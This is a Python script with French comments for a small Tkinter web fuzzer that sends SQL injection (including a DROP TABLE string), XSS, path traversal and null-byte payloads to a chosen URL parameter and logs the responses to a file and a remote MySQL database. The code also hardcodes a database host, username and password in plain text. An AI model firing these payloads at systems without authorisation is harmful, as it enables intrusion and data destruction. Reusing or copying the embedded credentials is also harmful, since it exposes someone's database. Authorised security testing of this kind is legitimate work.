import requests
import random
import string
import time
import os
import mysql.connector
import tkinter as tk
from tkinter import messagebox, scrolledtext
from datetime import datetime

# Configuration de la base de données
DB_HOST = "mysql-demonix9710.alwaysdata.net"
DB_USER = "373154"
DB_PASSWORD = "Troll2.0"
DB_NAME = "demonix9710_projet_bureau"

def save_report_to_db(report, timestamp):
    try:
        connection = mysql.connector.connect(
            host=DB_HOST,
            user=DB_USER,
            password=DB_PASSWORD,
            database=DB_NAME
        )
        cursor = connection.cursor()
        
        for entry in report:
            payload = entry.get("payload", "")
            status_code = entry.get("status_code", 0)
            response_length = entry.get("response_length", 0)
            potential_vulnerability = entry.get("potential_vulnerability", False)
            error = entry.get("error", "")
            
            cursor.execute(
                """
                INSERT INTO fuzzing_reports (timestamp, payload, status_code, response_length, potential_vulnerability, error)
                VALUES (%s, %s, %s, %s, %s, %s)
                """,
                (timestamp, payload, status_code, response_length, potential_vulnerability, error)
            )
        
        connection.commit()
        update_console("✅ Rapport sauvegardé dans la base de données.\n")
    except mysql.connector.Error as e:
        update_console(f"❌ Erreur lors de la connexion à la base de données: {e}\n")
    finally:
        if connection.is_connected():
            cursor.close()
            connection.close()

def fuzz(target_url, param_name, method="GET"):
    payloads = [
        "' OR '1'='1" ,  # Injection SQL
        "<script>alert('XSS')</script>",  # XSS
        "../../../../etc/passwd",  # Directory Traversal
        "AAAAA" * 100,  # Buffer Overflow
        "%00",  # Null byte injection
        "' OR 1=1 --",  # SQL Injection
        "\"; DROP TABLE users; --"
    ]
    
    report = []
    
    for payload in payloads:
        params = {param_name: payload} if method == "GET" else {}
        data = {param_name: payload} if method == "POST" else None
        
        try:
            if method == "GET":
                response = requests.get(target_url, params=params, timeout=5)
            elif method == "POST":
                response = requests.post(target_url, data=data, timeout=5)
            else:
                update_console("Méthode HTTP non supportée\n")
                return
            
            update_console(f"Test avec payload: {payload}\n")
            update_console(f"Statut: {response.status_code}, Longueur: {len(response.text)}\n")
            
            result = {
                "payload": payload,
                "status_code": response.status_code,
                "response_length": len(response.text),
                "potential_vulnerability": False
            }
            
            if "error" in response.text.lower() or response.status_code == 500:
                update_console(f"⚠️ Potentielle vulnérabilité détectée avec payload: {payload}\n")
                result["potential_vulnerability"] = True
            
            report.append(result)
            
        except requests.exceptions.RequestException as e:
            update_console(f"Erreur lors de la requête: {e}\n")
            report.append({"payload": payload, "error": str(e)})
        
        time.sleep(1)
    
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    report_filename = f"fuzzing_report_{timestamp}.txt"
    
    with open(report_filename, "w") as f:
        for entry in report:
            f.write(f"Payload: {entry.get('payload', '')}\n")
            f.write(f"Status Code: {entry.get('status_code', 0)}\n")
            f.write(f"Response Length: {entry.get('response_length', 0)}\n")
            f.write(f"Potential Vulnerability: {entry.get('potential_vulnerability', False)}\n")
            f.write(f"Error: {entry.get('error', '')}\n")
            f.write("-" * 50 + "\n")
    update_console(f"📄 Rapport de sécurité généré : {report_filename}\n")
    
    save_report_to_db(report, timestamp)

def update_console(message):
    console_text.insert(tk.END, message)
    console_text.see(tk.END)
    root.update()

def start_fuzzing():
    url = url_entry.get()
    param = param_entry.get()
    if not url or not param:
        messagebox.showerror("Erreur", "Veuillez entrer une URL et un paramètre.")
        return
    update_console("🔍 Début du fuzzing...\n")
    fuzz(url, param, "GET")
    update_console("✅ Fuzzing terminé.\n")

# Interface graphique
root = tk.Tk()
root.title("Fuzzer Web")
root.geometry("500x400")

tk.Label(root, text="URL cible:").pack()
url_entry = tk.Entry(root, width=50)
url_entry.pack()

tk.Label(root, text="Nom du paramètre:").pack()
param_entry = tk.Entry(root, width=30)
param_entry.pack()

tk.Button(root, text="Lancer le Fuzzing", command=start_fuzzing).pack()

# Zone de console
console_text = scrolledtext.ScrolledText(root, height=10, width=60)
console_text.pack()

root.mainloop()
